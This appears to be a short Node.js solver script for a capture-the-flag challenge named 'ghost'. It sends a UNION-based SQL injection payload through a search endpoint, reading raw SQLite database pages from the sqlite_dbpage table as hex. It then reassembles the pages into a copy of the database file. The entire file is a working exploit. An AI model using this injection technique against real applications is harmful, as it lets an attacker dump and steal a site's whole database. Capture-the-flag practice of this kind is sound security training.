import { writeFile } from "node:fs/promises";
import { init, send } from "./ghost-lib.mjs";

const session = await init();
const pages = [];
for (let page = 1; page <= 5; page += 1) {
  const payload = `%' UNION ALL SELECT 999,pgno,hex(data) FROM sqlite_dbpage WHERE pgno=${page}--`;
  const reply = await send(session, "search", { q: payload });
  const row = reply.data.rows.find((item) => item.id === 999 && item.title === page);
  if (!row) throw new Error(`missing page ${page}`);
  pages.push(Buffer.from(row.summary, "hex"));
}
await writeFile("work/d3ctf-ghost/archive.sqlite", Buffer.concat(pages));
